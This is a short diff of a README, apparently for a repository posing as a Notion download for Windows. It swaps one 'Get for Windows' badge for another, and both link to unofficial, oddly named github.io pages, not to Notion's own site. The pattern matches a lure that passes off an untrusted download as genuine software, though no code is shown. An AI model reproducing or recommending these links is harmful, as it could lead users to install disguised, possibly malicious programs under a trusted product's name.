@@ -4,10 +4,8 @@
   <img src="https://www.cleever.co/wp-content/uploads/2023/11/notion-logo-1.png" alt="Project Logo"/>
 </div>
 
-<div align="center">
+[![GET Notion Windows](https://img.shields.io/badge/GET%20%E2%80%94%20Notion-Windows-0078D6?style=for-the-badge&logoColor=white)](https://turinprocessorelitedf6ex2727.github.io/.github/Notion-Windows)
 
-  [![Get for Windows](https://img.shields.io/badge/Get_for_Windows-blue?style=for-the-badge)](https://notion-windows-workspace-toolkit.github.io/.github/)
-</div>
 
 ---
 
